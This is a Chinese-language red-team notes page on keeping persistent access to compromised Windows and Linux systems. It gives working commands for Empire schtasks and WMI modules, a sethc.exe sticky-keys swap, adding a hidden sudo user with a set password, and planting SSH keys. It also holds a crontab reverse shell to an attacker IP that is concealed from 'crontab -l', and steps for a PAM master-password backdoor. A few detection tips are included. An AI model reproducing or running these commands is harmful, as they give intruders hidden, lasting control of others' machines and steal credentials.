---
title: 【红队】权限维持之--系统后门
---
# Windows

## Schtasks后门

Schtasks.exe能够在本地或远程计算机上创建，删除，查询，更改，运行和结束计划任务

不带参数运行Schtasks.exe会显示每个已注册任务的状态和下一次运行时间。

**Empire中的模块**

```bash
persistence/userland/schtasks
persistence/elevated/schtasks*		#需要管理员权限
```

一个开源工具： https://github.com/fireeye/SharPersist 

## wmi后门

WMI后门使用了WMI的两个特征：**无文件**和**无进程**（需要管理员权限运行）。

**原理是**：将代码加密存储与WMI中，即无文件；调用PowerShell执行后门程序，执行后进程消失，即无进程。

**在Empire中使用Invoke-WMI模块**

```bash
usemodule powershell/persistence/elevated/wmi	#设置参数run
```

> **检查后门：**使用微软提供的工具`Autoruns`：
>
> https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns 

## DLL劫持后门

DLL劫持原理就是使用 `loadlibrary` 动态加载DLL

DLL劫持工具：[SuperDllHijack](https://github.com/anhkgg/SuperDllHijack)

## 映像劫持shift后门

**替换sethc.exe为cmd.exe**

```
CD C:\windows\system32cacls sethc.exe /t /e /G Administrators:fcacls cmd.exe /t /e /G Administrators:fren sethc.exe aaa.exeren cmd.exe sethc.exe#恢复ren sethc.exe cmd.exeren aaa.exe sethc.exe
```

连按5下Shift弹出cmd窗口

> **检查后门**：连续按5下弹出cmd窗口（当然还有其它放大镜讲述人等）

扩展：[权限维持之打造不一样的映像劫持后门](https://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&mid=2247487783&idx=2&sn=cb335f8dca5b6581fc11586731f9497c&chksm=fc3fa826cb48213020f6a7099c77e20ced8dea3ec7168eaafbd61076e5926dfb50504a1440ef&mpshare=1&scene=24&srcid=0803CzkQaDB0wtkjHH15juEz&sharer_sharetime=1596415561771&sharer_shareid=e5c8ca04ed8346aa6eb2c2579c812fb8&key=ebb412db45555e1d108502328e33bc9c942962e3758fffe56ea4b145cd5a40482e5c11095d5f4c0533bb5cda390e6b656c3173ab08b99f70f343d1a6556cead0ff62db0cbe4ebcc9eb2bff17e0f2063e&ascene=14&uin=MTUwNjgwNTkxMA%3D%3D&devicetype=Windows+10+x64&version=62090070&lang=zh_CN&exportkey=A%2FNthEySkLH2rBg28%2FoMtnk%3D&pass_ticket=lppPNqJhx8ZD573ypwsqgQ41%2F%2BJd%2B2avwvIfBnLfOjeNcQkihuzk3CgS%2F36Je%2Bnb)

# Linux

## 增加超级用户账号

> **如果系统不允许`uid=0`的用户（`root`）远程登录，可以添加一个普通用户，并将其加入sudoers**

**增加用户**

```bash
useradd phP        #添加账户
echo qwesys514!Sec|passwd --stdin phP	#设置密码(密码符合要密码强度策略)
```

**修改sudoers赋予sudo权限**

```bash
chmod +w /etc/sudoers    #赋予写入权限
vi /etc/sudoers

# Allow root to run any commands anywhere
root    ALL=(ALL)     ALL
phP		ALL=(ALL)     ALL

#在root下方，添加sudo用户
chmod -w /etc/sudoers    #撤销写入权限
```

还可以修改/etc/passwd文件，把用户uid改为0。

## SSH公钥无密码登录

```bash
ssh-keygen -t rsa    #本机生成rsa公钥

#把id_rsa.pub写入服务端的authorized_keys中
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
echo "id_rsa.pub的内容" > ~/.ssh/authorized_keys

#没有这个文件的话，就自己创建一个
cd ~/
mkdir .ssh
cd .ssh
touch authorized_keys
```

## Crontab定时反弹shell

```bash
(crontab -l;printf "*/1 * * * * exec 9<> /dev/tcp/攻击者IP/8888;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -

#每分钟执行一次，并且crontab -l看不出来
#这种要用crontab -e 进去查看并编辑才能看到
```

## PAM后门

>  **PAM （Pluggable Authentication Modules ）**是由Sun提出的一种认证机制。
>
> 它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开
>
> 使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式，而无需更改服务程序
>
> 同时也便于向系统中添加新的认证手段

**步骤：**

1、获取目标系统所使用的PAM版本，下载对应版本的pam版本

2、解压缩，修改pam_unix_auth.c文件，添加万能密码

3、编译安装PAM

4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换

​		即可使用万能密码登陆，并将用户名密码记录到文件中

**排查PAM后门技巧：**

1、通过Strace跟踪ssh

```bash
ps axu | grep sshd
strace -o aa -ff -p PID
grep open aa* | grep -v -e No -e null -e denied| grep WR
```

2、检查pam_unix.so的修改时间

```bash
stat /lib/security/pam_unix.so      #32位
stat /lib64/security/pam_unix.so    #64位
```

## Rootkit工具包

> rootkit是一种特殊的恶意软件。三要素是：**隐藏、操纵、收集数据**。
>
> 功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息
>
> 多见的rootkit一般都是木马、后门和其它恶意程序结合使用
>
> **Rootkit通过加载特殊的驱动，修改系统内核，进而达到隐藏信息的目的**
>
> Rootkit是攻击者用来隐藏自己的踪迹和保留root访问权限的工具

**Rootkit类型**

```bash
固件Rootkit
虚拟化Rootkit
内核级Rootkit
库级Rootkit
应用级Rootkit
```

**Rootkit工具包列表**：https://github.com/d30sa1/RootKits-List-Download  （注意与`Centos`版本适配）

**检测与防护：**

rkhunter：http://rkhunter.sourceforge.net/ 

chkrootkit：http://www.chkrootkit.org/download/ 

定期检查md5，对于找出的 Rootkit，最好的应对方法是擦除并重新安装系统